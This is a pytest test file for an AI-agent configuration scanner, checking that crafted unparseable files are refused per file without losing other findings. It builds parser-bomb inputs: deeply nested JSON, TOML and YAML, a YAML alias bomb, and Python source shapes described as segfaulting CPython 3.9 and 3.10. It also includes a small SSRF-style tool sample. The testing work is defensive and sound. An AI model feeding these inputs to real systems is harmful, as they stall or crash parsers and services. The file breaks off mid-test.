"""A file AAK cannot read costs that file alone.

The stall sweep of 2026-10-17 found one crafted file taking a whole scanner down:
Python's JSON, TOML and YAML parsers and `ast.parse` recurse, scanners caught
neither RecursionError nor MemoryError, and an exception out of `scan()` loses
every finding that scanner would have made on every other file (classes A to G).
A refused file is now reported against that file as AAK-INTERNAL-SCANNER-FAIL,
so the scan is INCOMPLETE as before, and every other file keeps its findings.
Classes H to J were plain bugs on tiny inputs: a whitespace-only command (H, in
`test_mcp_config`), one invalid UTF-8 byte in a JSON config (I) and a JSON top
level that is not an object (J).
"""

from __future__ import annotations

import ast
import json
import os
import re
import shutil
import subprocess
import sys
import sysconfig
import tempfile
import textwrap
import time
import warnings
from pathlib import Path
from typing import Callable

import pytest
import yaml
from click.testing import CliRunner

from agent_audit_kit.cli import cli
from agent_audit_kit.engine import run_scan
from agent_audit_kit.models import SCANNER_FAIL_RULE_ID, ScanResult
from agent_audit_kit.scanners import _helpers
from agent_audit_kit.scanners._helpers import (
    RefusedJSON,
    RefusedSource,
    RefusedTOML,
    RefusedYAML,
    collecting_refusals,
    compose_yaml_all,
    load_yaml,
    load_yaml_all,
    loads_json,
    loads_jsonc,
    loads_toml,
    parse_python,
    python_nesting_bound,
    refusing_overflow,
)

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"
DEEP_JSON = "[" * 100_000 + "]" * 100_000

# A project with findings from the config, hook, A2A, supply-chain and Python
# scanners, so a scanner that loses its run loses something visible.
_BASE_PARTS = (
    (ROOT / "examples" / "vulnerable-configs", "configs"),
    (FIXTURES / "limitations" / "AAK-MCP-TOOL-UNSAFE-EVAL-001" / "positive", "py_eval"),
    (FIXTURES / "limitations" / "AAK-SSRF-001" / "positive", "py_ssrf"),
    (FIXTURES / "cves" / "cve-2026-41488" / "vulnerable-toctou", "py_toctou"),
    (FIXTURES / "incidents" / "ox-mcp-marketplace-fetch", "py_marketplace"),
)

# The marker the parse overflow below is forced on: the depth at which CPython's
# parser gives up differs from one version to the next (3.9 builds a 500,000-deep
# tree that 3.12 refuses), so the containment is tested on every version alike.
_OVERFLOW_MARKER = "# AAK-TEST-PARSER-OVERFLOW"


def _alias_bomb(levels: int = 9, width: int = 9) -> str:
    lines = ["a0: &a0 {" + ", ".join(f"k{j}: lol" for j in range(width)) + "}"]
    for level in range(1, levels):
        lines.append(f"a{level}: &a{level} {{" + ", ".join(f"k{j}: *a{level - 1}" for j in range(width)) + "}")
    return "\n".join(lines) + "\n"


_PY_HINTS = "import requests\nfrom mcp.server.fastmcp import FastMCP\nmcp = FastMCP('x')\n"

HOSTILE = {
    # C: JSON nested past `JSON_MAX_NESTING` (and every version's parser but 3.14's).
    ".mcp.json": DEEP_JSON,
    ".claude/settings.json": DEEP_JSON,
    "package.json": DEEP_JSON,
    "agent-card.json": DEEP_JSON,
    ".vscode/tasks.json": DEEP_JSON,
    # D: TOML nested past the parser, and a dotted key past the screen.
    "pyproject.toml": "[project]\nname = 'x'\ndependencies = ['mcp']\nx = " + "[" * 3000 + "]" * 3000 + "\n",
    "Pipfile": "[packages]\n" + ".".join(f"k{i}" for i in range(5000)) + " = '*'\n",
    # E and stall row 1: YAML nested past the loader's limit, and an alias bomb.
    "openapi.yaml": "openapi: 3.0.0\npaths: " + "[" * 3000 + "]" * 3000 + "\n",
    ".github/workflows/ci.yml": _alias_bomb() + "on: [push]\njobs:\n  b:\n    runs-on: x\n    env: *a8\n",
    "skills/x/SKILL.md": "---\nname: x\nmeta: " + "[" * 2000 + "]" * 2000 + "\n---\nbody\n",
    # A: the parser overflows (forced, see `_OVERFLOW_MARKER`).
    "overflow.py": _PY_HINTS + _OVERFLOW_MARKER + "\n@mcp.tool()\ndef f(url):\n    return requests.get(url)\n",
}


def _base(tmp_path: Path) -> Path:
    root = tmp_path / "proj"
    for src, dst in _BASE_PARTS:
        shutil.copytree(src, root / dst)
    return root


def _write(root: Path, files: dict[str, str | bytes]) -> None:
    for rel, content in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")


def _findings(result: ScanResult) -> set[tuple[str, str, int | None]]:
    return {(f.rule_id, f.file_path, f.line_number) for f in result.findings if f.rule_id != SCANNER_FAIL_RULE_ID}


def _refused(result: ScanResult) -> dict[str, set[str]]:
    out: dict[str, set[str]] = {}
    for f in result.scanner_failures:
        if f.file_path != "<scanner>":
            out.setdefault(f.file_path, set()).add(f.evidence.split("'")[1])
    return out


def _crashed(result: ScanResult) -> list[str]:
    return [f.evidence for f in result.scanner_failures if f.file_path == "<scanner>"]


@pytest.fixture
def forced_parser_overflow(monkeypatch: pytest.MonkeyPatch) -> None:
    real = _helpers._ast_parse

    def parse(source: str | bytes, filename: str) -> ast.Module:
        text = source if isinstance(source, str) else source.decode("utf-8", "replace")
        if _OVERFLOW_MARKER in text:
            raise RecursionError("maximum recursion depth exceeded during ast construction")
        return real(source, filename)

    monkeypatch.setattr(_helpers, "_ast_parse", parse)


def test_every_hostile_file_costs_that_file_alone(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, forced_parser_overflow: None
) -> None:
    monkeypatch.setenv("AAK_TOXIC_FLOW", "1")
    root = _base(tmp_path)
    baseline = run_scan(root, strict_loading=True)
    assert not baseline.scanner_failures and len(_findings(baseline)) > 100
    _write(root, HOSTILE)
    result = run_scan(root, strict_loading=True)
    assert not _crashed(result)
    lost = _findings(baseline) - _findings(result)
    assert not lost, f"a hostile file cost another file its findings: {sorted(lost)[:10]}"
    refused = _refused(result)
    assert set(HOSTILE) <= set(refused), sorted(set(HOSTILE) - set(refused))
    # The always-on scanners that read the deep MCP config each report it.
    assert {"MCP configuration", "Supply chain"} <= refused[".mcp.json"]
    assert {"Hook injection", "Trust boundary"} <= refused[".claude/settings.json"]


def test_a_refusal_is_reported_against_the_file_with_scanner_file_and_reason(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": DEEP_JSON})
    failure = next(f for f in run_scan(tmp_path).scanner_failures if "MCP configuration" in f.evidence)
    assert failure.file_path == ".mcp.json"
    assert failure.evidence == (
        "scanner='MCP configuration' error=RefusedFile: .mcp.json: JSON nested deeper than 500 "
        "levels; the rules it owns were not evaluated on this file"
    )


def test_a_refusal_keeps_the_scan_incomplete_as_a_crash_did(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": DEEP_JSON})
    runner = CliRunner()
    res = runner.invoke(cli, ["scan", str(tmp_path)])
    assert res.exit_code == 1
    assert "INCOMPLETE" in res.output
    out = tmp_path / "r.json"
    runner.invoke(cli, ["scan", str(tmp_path), "--format", "json", "-o", str(out)])
    summary = json.loads(out.read_text())["summary"]
    assert summary["complete"] is False and summary["scannerFailures"] >= 1
    assert runner.invoke(cli, ["scan", str(tmp_path), "--allow-scanner-failure"]).exit_code == 0


def test_the_incomplete_message_counts_scanners_and_names_a_refused_file(
    tmp_path: Path, forced_parser_overflow: None
) -> None:
    """A scanner that refuses two files fails twice; the message counts it once,
    and says a refused file as well as a crash leaves the scan incomplete."""
    body = _PY_HINTS + _OVERFLOW_MARKER + "\n"
    _write(tmp_path, {"a.py": body, "b.py": body})
    result = run_scan(tmp_path, strict_loading=True)
    scanners = result.failed_scanners
    assert scanners and len(result.scanner_failures) == 2 * len(scanners)
    res = CliRunner().invoke(cli, ["scan", str(tmp_path)])
    assert res.exit_code == 1
    assert (
        f"INCOMPLETE: {len(scanners)} scanner(s) did not finish every file (a crash or a refused file); "
        "the rules they own may be missing findings."
    ) in res.output
    assert f"INCOMPLETE SCAN: {len(scanners)} scanner(s) did not finish every file" in res.output


def test_an_ignored_path_drops_its_refusal_too(tmp_path: Path) -> None:
    _write(tmp_path, {"vendored/evil-mcp.json": DEEP_JSON})
    assert run_scan(tmp_path, ignore_paths=["vendored"]).scanner_failures == []


# ---------------------------------------------------------------------------
# The parse helpers
# ---------------------------------------------------------------------------


def test_each_parse_helper_records_a_refusal_and_raises_the_error_its_readers_catch() -> None:
    cases: list[tuple[str, Callable[[str], object], type[Exception]]] = [
        ("a.json", lambda path: loads_json(DEEP_JSON, path), json.JSONDecodeError),
        ("b.json", lambda path: loads_jsonc(DEEP_JSON, path), json.JSONDecodeError),
        ("c.toml", lambda path: loads_toml("x = " + "[" * 3000 + "]" * 3000, path), ValueError),
        ("d.yaml", lambda path: load_yaml("a: " + "[" * 200 + "]" * 200, path), yaml.YAMLError),
        ("e.yaml", lambda path: load_yaml_all("---\na: 1\n---\n" + _alias_bomb(), path), yaml.YAMLError),
        ("f.yaml", lambda path: compose_yaml_all("b: " + "{a: " * 200 + "1" + "}" * 200, path), yaml.YAMLError),
    ]
    with collecting_refusals() as refused:
        for path, call, caught_as in cases:
            with pytest.raises(caught_as):
                call(path)
    assert list(refused) == [path for path, _, _ in cases]


def test_the_refusal_types_are_the_errors_each_reader_already_catches() -> None:
    assert issubclass(RefusedJSON, json.JSONDecodeError)
    assert issubclass(RefusedSource, SyntaxError)
    assert issubclass(RefusedTOML, _helpers.tomllib.TOMLDecodeError)
    assert issubclass(RefusedYAML, yaml.YAMLError)


def test_without_a_path_an_overflow_propagates_rather_than_vanishing(monkeypatch: pytest.MonkeyPatch) -> None:
    """A caller that has no path contains the overflow itself; a refusal is never
    lost to a missing path, because it never turns into a parse error."""
    with pytest.raises(RecursionError):
        loads_json(DEEP_JSON, None)
    with pytest.raises(RecursionError):
        loads_jsonc(DEEP_JSON)
    monkeypatch.setattr(_helpers, "_ast_parse", lambda s, f: (_ for _ in ()).throw(MemoryError()))
    with pytest.raises(MemoryError):
        parse_python("x = 1", None)
    with collecting_refusals() as refused:
        with refusing_overflow("g.py"):
            parse_python("x = 1", None)
    assert refused == {"g.py": "syntax tree too deep for this scanner to walk (MemoryError)"}


@pytest.mark.parametrize("error", [RecursionError, MemoryError])
def test_parse_python_refuses_an_overflow_of_either_kind(monkeypatch: pytest.MonkeyPatch, error: type) -> None:
    monkeypatch.setattr(_helpers, "_ast_parse", lambda s, f: (_ for _ in ()).throw(error()))
    with collecting_refusals() as refused, pytest.raises(SyntaxError):
        parse_python("x = 1", "h.py")
    assert refused == {"h.py": f"Python source nested too deep to parse ({error.__name__})"}


_SEGFAULT_PROBE = textwrap.dedent("""
    import sys
    from agent_audit_kit.scanners._helpers import collecting_refusals, parse_python
    source = {
        "unary_plus": "+" * 500_000 + "a",
        "lambda_defaults": "lambda a=" * 45_000 + "1: a" * 45_000,
        "binop_chain": "a" + "+a" * 250_000,
        "minus_minus": "--a" * 170_000,
    }[sys.argv[1]]
    with collecting_refusals() as refused:
        try:
            parse_python(source, "x.py")
            print("parsed")
        except SyntaxError:
            print("refused" if "x.py" in refused else "invalid")
""")


@pytest.mark.parametrize("shape", ["unary_plus", "lambda_defaults", "binop_chain", "minus_minus"])
def test_a_crafted_python_source_never_takes_the_process_down(shape: str) -> None:
    """3.9 segfaults on the first two and 3.10 on the last two (exit 139), past
    any except: before 3.11 the tree is built in C with no depth check. 3.11
    and later raise. Whatever the version, the process lives."""
    out = subprocess.run(
        [sys.executable, "-c", _SEGFAULT_PROBE, shape],
        capture_output=True, text=True, timeout=300, cwd=ROOT, env={"PYTHONPATH": str(ROOT), "PATH": ""},
    )
    assert out.returncode == 0, (out.returncode, out.stderr[-500:])
    assert out.stdout.strip() in ("parsed", "refused"), out.stdout


# ---------------------------------------------------------------------------
# The screen before 3.11: a source too deep for the parser is refused unparsed
# ---------------------------------------------------------------------------

# Crafted shapes, each `n` levels deep: the ones that crashed 3.9 or 3.10, and
# the other operator chains the grammar nests without a bracket.
_DEEP_SHAPES: dict[str, Callable[[int], str]] = {
    "unary_plus": lambda n: "x = " + "+" * n + "a\n",
    "lambda_defaults": lambda n: "x = " + "lambda a=" * n + "1: a" * n + "\n",
    "binop_chain": lambda n: "x = a" + "+a" * n + "\n",
    "minus_minus": lambda n: "x = " + "--a" * n + "\n",
    "not_chain": lambda n: "x = " + "not " * n + "a\n",
    "ternary": lambda n: "x = " + "a if a else " * n + "a\n",
    "power": lambda n: "x = a" + "**a" * n + "\n",
    "attribute_chain": lambda n: "x = a" + ".a" * n + "\n",
    "call_chain": lambda n: "x = a" + "()" * n + "\n",
    "lambda_body": lambda n: "x = " + "lambda: " * n + "a\n",
    "fstring_field": lambda n: "x = f'{a" + "+a" * n + "}'\n",
    "elif_ladder": lambda n: "if a:\n    pass\n" + "elif a:\n    pass\n" * n,
    # A backslash joins the next line before an LF, a CRLF or a CR alone, and
    # inside a one-line string before a CRLF it continues the string.
    "continued_lf": lambda n: "x = a \\\n" + "  + a \\\n" * n + "  + a\n",
    "continued_crlf": lambda n: "x = a \\\r\n" + "  + a \\\r\n" * n + "  + a\r\n",
    "continued_cr": lambda n: "x = a \\\r" + "  + a \\\r" * n + "  + a\r",
    "string_continued_crlf": lambda n: "x = 'a\\\r\n' + a" + " + a" * n + "\n",
    "fstring_continued_crlf": lambda n: "x = f'a\\\r\n' + a" + " + a" * n + "\n",
    # The tokenizer stops brackets at 200 levels, so this one never reaches the screen's limit.
    "nested_brackets": lambda n: "x = " + "(" * n + "a" + ")" * n + "\n",
}


def _tree_depth(tree: ast.AST) -> int:
    best, stack = 0, [(tree, 1)]
    while stack:
        node, depth = stack.pop()
        best = max(best, depth)
        stack.extend((child, depth + 1) for child in ast.iter_child_nodes(node))
    return best


def _not_parsed(source: str | bytes, filename: str) -> ast.Module:
    raise AssertionError("a source past the screen reached the parser")


@pytest.mark.parametrize("shape", sorted(_DEEP_SHAPES))
def test_the_screen_bound_is_never_below_the_tree_depth(shape: str) -> None:
    for n in (1, 20, 150):
        source = _DEEP_SHAPES[shape](n)
        assert python_nesting_bound(source) >= _tree_depth(ast.parse(source)), (shape, n)
    assert python_nesting_bound("") >= _tree_depth(ast.parse(""))


@pytest.mark.parametrize("shape", sorted(set(_DEEP_SHAPES) - {"nested_brackets"}))
def test_before_3_11_a_source_past_the_screen_is_refused_without_a_parse(
    shape: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Before 3.11 the parser has no depth check and segfaults on these shapes
    inside the source caps (3.9.6 has no depth guard at all; 3.9.25 and 3.10
    guard the recursive rules, not the left-recursive chains). Parsed on the
    large-stack worker instead, one costs up to 0.35 s and 380 MB; the screen
    refuses it in one linear pass."""
    monkeypatch.setattr(_helpers, "_SCREEN_SOURCES", True)
    monkeypatch.setattr(_helpers, "_ast_parse", _not_parsed)
    with collecting_refusals() as refused, pytest.raises(RefusedSource):
        parse_python(_DEEP_SHAPES[shape](21_000), "x.py")
    assert refused["x.py"].startswith("Python source nests deeper than")
    with pytest.raises(RecursionError):  # without a path it propagates, as the parser's own refusal does
        parse_python(_DEEP_SHAPES[shape](21_000), None)


def test_the_screen_passes_a_source_at_its_bound_and_refuses_one_past_it(monkeypatch: pytest.MonkeyPatch) -> None:
    """The bound is `_PY_MAX_NESTING` (10,000; 20,000 before the core review):
    a source the screen bounds at it reaches the parser, one level more is
    refused without a parse."""
    monkeypatch.setattr(_helpers, "_SCREEN_SOURCES", True)
    parsed: list[object] = []

    def counting(source: str | bytes, filename: str) -> ast.Module:
        parsed.append(source)
        return ast.Module(body=[], type_ignores=[])

    monkeypatch.setattr(_helpers, "_ast_parse", counting)
    chain = _DEEP_SHAPES["binop_chain"]
    at = _helpers._PY_MAX_NESTING - (python_nesting_bound(chain(100)) - 100)
    assert python_nesting_bound(chain(at)) == _helpers._PY_MAX_NESTING
    parse_python(chain(at), "at.py")
    with collecting_refusals() as refused, pytest.raises(RefusedSource):
        parse_python(chain(at + 1), "past.py")
    assert len(parsed) == 1 and set(refused) == {"past.py"}


def test_real_code_is_far_inside_the_screen() -> None:
    """On 100,303 real files (eight interpreters' standard libraries and every
    package in a 2,000-distribution site-packages) the highest bound was 4,585,
    a 562-term polynomial sympy generates (sympy/polys/numberfields/
    resolvent_lookup.py), and the 99.9th percentile 65; each file's bound was
    at least its tree's depth. Here: that polynomial's shape, the longest real
    `elif` ladder (162, snowballstemmer's Serbian stemmer), and a sample of
    this interpreter's standard library."""
    polynomial = (
        "RESOLVENTS = {\n    (6, 1): [\n        lambda s1, s2, s3: (s1**6\n"
        + "            - 12*s1**4*s2*s3 + 9*s2**3\n" * 281
        + "        ),\n    ],\n}\n"
    )
    ladder = "def stem(w):\n    if w == 'a0':\n        return 0\n" + "".join(
        f"    elif w == 'a{i}':\n        return {i}\n" for i in range(1, 163)
    )
    for source in (polynomial, ladder):
        assert _tree_depth(ast.parse(source)) <= python_nesting_bound(source) <= 5_000
    stdlib = []
    for folder, subfolders, names in os.walk(sysconfig.get_paths()["stdlib"]):
        subfolders[:] = [name for name in subfolders if name != "site-packages"]
        stdlib.extend(Path(folder, name) for name in names if name.endswith(".py"))
    sample = sorted(stdlib)[::5]
    checked = 0
    for path in sample:
        source = path.read_text(encoding="utf-8", errors="replace")
        try:
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                tree = ast.parse(source)
        except SyntaxError:
            continue
        assert _tree_depth(tree) <= python_nesting_bound(source) < _helpers._PY_MAX_NESTING, path
        checked += 1
    assert checked > 100  # 127 to 375 on Python 3.9 to 3.14


def test_the_screen_reads_a_crafted_source_in_linear_time() -> None:
    """Each shape the screen reads in a pass of its own: a string of escapes, an
    f-string of fields, a chain, an `elif` ladder and indentation that churns.
    At these sizes a pass that restarted per escape or per field takes over
    5 s; the screen takes a few hundredths."""
    def source(n: int) -> str:
        return (
            "s = '" + "\\'" * n + "'\n"
            + "f = f'" + "{a}" * n + "'\n"
            + "x = a" + "+a" * n + "\n"
            + "if a:\n    pass\n" + "elif a:\n    pass\n" * (n // 4)
            + "".join(" " * (i % 40) + "pass\n" for i in range(n // 4))
        )

    small, large = source(10_000), source(100_000)
    _grows_linearly(lambda: _helpers._nesting_bound(small), lambda: _helpers._nesting_bound(large))


def test_each_source_is_screened_once_however_many_scanners_parse_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Scanners run one after another over every file, so a cache of the last
    few sources missed on any project with more files than it held, and each
    file was screened again by every scanner that parsed it."""
    monkeypatch.setattr(_helpers, "_SCREEN_SOURCES", True)
    monkeypatch.setattr(_helpers, "_BOUNDS", {})
    screened: list[str] = []
    real = _helpers._nesting_bound

    def counting(source: str) -> int:
        screened.append(source)
        return real(source)

    monkeypatch.setattr(_helpers, "_nesting_bound", counting)
    files = {f"pkg/m{i}.py": _PY_HINTS + f"@mcp.tool()\ndef f{i}(url):\n    return requests.get(url)\n"
             for i in range(40)}
    _write(tmp_path, files)
    run_scan(tmp_path, strict_loading=True)
    assert len(screened) == len(set(screened)) == len(files)


def _child(code: str, *args: str, timeout: float = 120) -> str:
    """Run `code` in a child, so a regression that loops for ever fails on the
    timeout instead of hanging the suite (pytest here has no timeout plugin)."""
    out = subprocess.run(
        [sys.executable, "-c", textwrap.dedent(code), *args], capture_output=True, text=True,
        timeout=timeout, cwd=ROOT,
        env={"PYTHONPATH": str(ROOT), "PATH": "", "HOME": tempfile.mkdtemp(prefix="aak-home-")},
    )
    assert out.returncode == 0, out.stderr[-1000:]
    return out.stdout.strip()


def _bounded_seconds(run: Callable[[], object]) -> float:
    """Best of three in CPU time, which a loaded machine moves least."""
    best = float("inf")
    for _ in range(3):
        started = time.process_time()
        run()
        best = min(best, time.process_time() - started)
    return best


def _grows_linearly(small: Callable[[], object], large: Callable[[], object]) -> None:
    """``large`` is ten times the input of ``small``."""
    t_small, t_large = _bounded_seconds(small), _bounded_seconds(large)
    assert t_large < 5.0
    assert t_large < 40 * t_small + 0.25, (t_small, t_large)


_LONG_LINE_PARSE = """
    import sys
    from pathlib import Path
    from agent_audit_kit.scanners import ssrf_toctou
    root = Path(sys.argv[1])
    path = root / "server.py"
    ssrf_toctou._walk_python(path.read_text(), path, root, set())
    print("survived")
"""


def test_a_line_that_does_not_parse_is_never_read_back_from_its_file(tmp_path: Path) -> None:
    """On a SyntaxError, 3.9 reads the offending line back from the file it was
    told it parsed, into a 1,000-byte buffer, then decodes as many bytes from
    that buffer as the error's column: an out-of-bounds read as long as the
    line. Inside ssrf_toctou's 1 MB source cap it crashed 1 run in 24; a 1.1 MB
    line, past the cap and fed to the same parse here, crashes every run on
    3.9.6 and 3.9.25. Given a name no file has, the parser takes the line from
    the source in memory."""
    _write(tmp_path, {"server.py": "import requests\nx = " + "a" * 1_100_000 + " $\n"})
    assert _child(_LONG_LINE_PARSE, str(tmp_path)) == "survived"


def test_the_parser_is_never_given_a_name_a_file_could_have(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A relative name such as "<unknown>" is not enough either: a scan runs
    inside the repository, which can commit a file of that name."""
    names: list[str] = []
    real = _helpers._ast_parse

    def recording(source: str | bytes, filename: str) -> ast.Module:
        names.append(filename)
        return real(source, filename)

    monkeypatch.setattr(_helpers, "_ast_parse", recording)
    _write(tmp_path, {"server.py": _PY_HINTS + "@mcp.tool()\ndef f(url):\n    return requests.get(url)\n"})
    run_scan(tmp_path, strict_loading=True)
    assert len(names) > 10 and set(names) == {_helpers._PARSE_FILENAME}
    with pytest.raises(OSError):
        open(_helpers._PARSE_FILENAME)


# An invalid escape sequence: a SyntaxWarning on 3.12 and later, a
# DeprecationWarning before.
_INVALID_ESCAPE = 'PATTERN = "\\d+"\n'


def _scan_in_child(root: Path, *python_flags: str) -> tuple[set[str], str]:
    out = root.parent / f"{root.name}-{len(python_flags)}.json"
    proc = subprocess.run(
        [sys.executable, *python_flags, "-m", "agent_audit_kit.cli", "scan", str(root), "--format", "json",
         "-o", str(out)],
        capture_output=True, text=True, timeout=300, cwd=ROOT,
        env={"PYTHONPATH": str(ROOT), "PATH": "", "HOME": tempfile.mkdtemp(prefix="aak-home-")},
    )
    assert proc.returncode == 0, proc.stderr[-1000:]
    return {f["ruleId"] for f in json.loads(out.read_text())["findings"]}, proc.stderr


def test_a_warning_the_parse_raises_stays_out_of_the_scan(tmp_path: Path) -> None:
    """One invalid escape sequence printed a warning for each scanner that
    parsed the file (21 lines on 3.12), naming the file, "<unknown>", or the
    one name every parse is now given. A warning about the scanned code is not
    AAK's output, and under `-W error` it turned a file that parses into one
    that does not, dropping that file's findings without a word."""
    root = tmp_path / "proj"
    _write(root, {"server.py": _PY_HINTS + _INVALID_ESCAPE + "@mcp.tool()\ndef f(url):\n    return requests.get(url)\n"})
    findings, stderr = _scan_in_child(root)
    assert findings and "Warning" not in stderr, stderr[-500:]
    strict, _ = _scan_in_child(root, "-W", "error:invalid escape sequence")
    assert strict == findings


def test_a_long_dotted_toml_key_is_refused_in_linear_time() -> None:
    """tomllib builds a dotted key a tuple concatenation at a time: 20,000 parts
    (129 KB) took 3.6 s, and the 2 MB a manifest may be held a key that takes
    hours. The screen counts parts in one pass and refuses past 64."""
    def key(parts: int) -> str:
        return "[project]\nname = 'x'\n" + ".".join(f"k{i}" for i in range(parts)) + " = 1\n"

    def refuse(parts: int) -> Callable[[], object]:
        def run() -> None:
            with pytest.raises(RefusedTOML):
                loads_toml(key(parts), "pyproject.toml")
        return run

    _grows_linearly(refuse(2_000), refuse(20_000))
    assert loads_toml(key(64), "pyproject.toml")["project"]["name"] == "x"


def test_real_toml_keys_and_strings_full_of_dots_are_read() -> None:
    text = (
        'description = "' + "word. " * 500 + '"\n'
        'long = """\n' + "a.b." * 500 + '\n"""\n'
        "# " + "c." * 500 + "\n"
        "url = 'https://" + "x." * 200 + "example/'\n"
        '[tool.hatch.build.targets.wheel.force-include]\n"a.b.c.d.e.f.g.h" = "x"\n'
    )
    data = loads_toml(text, "pyproject.toml")
    assert {"description", "long", "url", "tool"} <= set(data)


# ---------------------------------------------------------------------------
# The YAML loader: nesting and alias bounds, calibrated on real files
# ---------------------------------------------------------------------------


def _block(levels: int, leaf: str = "1") -> str:
    """A mapping nested `levels` block levels deep, holding `leaf`."""
    return "".join(" " * i + f"k{i}:\n" for i in range(levels - 1)) + " " * (levels - 1) + f"v: {leaf}\n"


def test_yaml_as_deep_as_real_files_is_read() -> None:
    """cert-manager's Issuer CRD nests 37 block levels, the deepest of the real
    files measured, and an Envoy config dump in istio's test data nests 31
    levels of brackets. Blocks are read to 100 levels and brackets, separately,
    to 64, so a file holds both at once."""
    flow_limit = _helpers.YAML_MAX_FLOW_NESTING
    assert flow_limit == 64
    assert load_yaml(_block(100), "crd.yaml") is not None
    lists = "a: " + "[" * flow_limit + "1" + "]" * flow_limit
    mappings = "a: " + "{a: " * flow_limit + "1" + "}" * flow_limit
    for flow in (lists, mappings):
        assert load_yaml(flow, "deep.yaml") is not None
    value = load_yaml(_block(100, "[" * flow_limit + "1" + "]" * flow_limit), "both.yaml")
    for i in range(99):
        value = value[f"k{i}"]
    value = value["v"]
    for _ in range(flow_limit):
        assert isinstance(value, list) and len(value) == 1
        value = value[0]
    assert value == 1


def test_yaml_past_the_block_or_the_bracket_limit_is_refused_per_file() -> None:
    """Past 100 block levels, or 64 levels of `[ ]` or `{ }` (each refused
    where the scanner meets it, so 990 KB of brackets costs no more than the
    first unit past the limit)."""
    past = _helpers.YAML_MAX_FLOW_NESTING + 1
    with collecting_refusals() as refused:
        with pytest.raises(RefusedYAML):
            load_yaml(_block(101), "deeper.yaml")
        with pytest.raises(RefusedYAML):
            load_yaml("a: " + "[" * past + "]" * past, "brackets.yaml")
        with pytest.raises(RefusedYAML):
            load_yaml_all("a: " + "{a: " * past + "1" + "}" * past, "mapping.yaml")
        unit = "[" * 99 + "]" * 99
        big = "x:\n" + "".join(f"  - {unit}\n" for _ in range(990_000 // (len(unit) + 5)))
        started = time.process_time()
        with pytest.raises(RefusedYAML):
            load_yaml(big, "big.yaml")
        assert time.process_time() - started < 2.0
    assert refused == {
        "deeper.yaml": "YAML nested deeper than 100 levels",
        "brackets.yaml": "YAML [ ] or { } nested deeper than 64 levels",
        "mapping.yaml": "YAML [ ] or { } nested deeper than 64 levels",
        "big.yaml": "YAML [ ] or { } nested deeper than 64 levels",
    }


def test_a_compose_file_that_merges_a_shared_block_into_every_service_is_read() -> None:
    """20 services merging 40 shared variables: 1,689 characters that expand to
    13,417 nodes, eight times their length, well inside the 200,000 floor."""
    shared = "x-env: &env\n" + "".join(f"  VAR_{i}: value_{i}\n" for i in range(40))
    services = "services:\n" + "".join(f"  s{i}:\n    image: app\n    environment:\n      <<: *env\n" for i in range(20))
    data = load_yaml(shared + services, "docker-compose.yml")
    assert len(data["services"]) == 20 and len(data["services"]["s19"]["environment"]) == 40


_BOMB_LOAD = """
    import sys, time
    sys.path.insert(0, "tests")
    from test_refused_files import _alias_bomb
    from agent_audit_kit.scanners._helpers import RefusedYAML, load_yaml
    text = _alias_bomb(levels=9, width=int(sys.argv[1]))
    best = float("inf")
    for _ in range(3):
        started = time.process_time()
        try:
            load_yaml(text, "bomb.yaml")
            print("read"); raise SystemExit
        except RefusedYAML:
            best = min(best, time.process_time() - started)
    print(best)
"""


def test_an_alias_bomb_is_refused_in_linear_time() -> None:
    """Stall row 1: a 6 KB billion-laughs file held gha_hardening past 15 s and a
    7 KB one past 300 s. The expansion is sized once per node, so refusing costs
    the composition alone. In a child: a sizing that stopped memoizing would
    expand 90 ** 9 nodes."""
    small, large = float(_child(_BOMB_LOAD, "9")), float(_child(_BOMB_LOAD, "90"))
    assert large < 5.0 and large < 40 * small + 0.25, (small, large)


def test_a_self_referencing_alias_and_a_stream_of_bombs_are_refused() -> None:
    with collecting_refusals() as refused:
        with pytest.raises(RefusedYAML):
            load_yaml("loop: &a [*a]\n", "loop.yaml")
        documents = "".join(f"---\nd{i}: &d [{', '.join(['x'] * 1000)}]\nr: [{', '.join(['*d'] * 99)}]\n"
                            for i in range(10))
        with pytest.raises(RefusedYAML):
            load_yaml_all(documents, "stream.yaml")
    assert set(refused) == {"loop.yaml", "stream.yaml"}


def test_a_reader_that_visits_each_node_once_may_read_a_self_referencing_document() -> None:
    """`_manifest_deps` reads each container once, so it opts in; composing
    always allows it, since a walker of composed nodes must visit each once."""
    text = "a: &x\n  - command: npx\n  - *x\n"
    with collecting_refusals() as refused:
        data = load_yaml(text, "x.yaml", cycles_ok=True)
        assert data["a"][1] is data["a"]
        assert len(compose_yaml_all(text, "y.yaml")) == 1
    assert refused == {}


_SCAN_ONE = """
    import sys, time
    from pathlib import Path
    from agent_audit_kit.scanners._helpers import collecting_refusals
    module = __import__("agent_audit_kit.scanners." + sys.argv[1], fromlist=["scan"])
    root, rel = Path(sys.argv[2]), sys.argv[3]
    best, refused = float("inf"), {}
    for _ in range(3):
        started = time.process_time()
        with collecting_refusals() as refused:
            module.scan(root)
        best = min(best, time.process_time() - started)
    print(best, rel in {Path(p).relative_to(root).as_posix() for p in refused})
"""


@pytest.mark.parametrize(("rel", "scanner_module"), [
    (".github/workflows/ci.yml", "gha_hardening"),
    ("openapi.yaml", "openapi_smells"),
    ("crew.yaml", "eu_ai_act_art15_locale"),
    ("server.mcp.yml", "mcp_cve_pins_2026_07"),
    ("mcp-tunnels/config.yaml", "mcp_tunnel"),
])
def test_each_yaml_scanner_refuses_an_alias_bomb_in_linear_time(
    tmp_path: Path, rel: str, scanner_module: str
) -> None:
    """The five scanners stall row 1 named, each on the bomb shape that held it,
    in a child: before the bound, the larger file held each one for hours."""

    def project(width: int) -> Path:
        root = tmp_path / f"w{width}"
        top = "a8"
        body = {
            "gha_hardening": f"on: [push]\njobs:\n  b:\n    runs-on: x\n    steps: [*{top}]\n    env: *{top}\n",
            "openapi_smells": f"openapi: 3.0.0\npaths: *{top}\n",
            "eu_ai_act_art15_locale": f"agents: *{top}\n",
            "mcp_cve_pins_2026_07": f"mcpServers: *{top}\n",
            "mcp_tunnel": f"tunnel_domain: x\nroutes: *{top}\n",
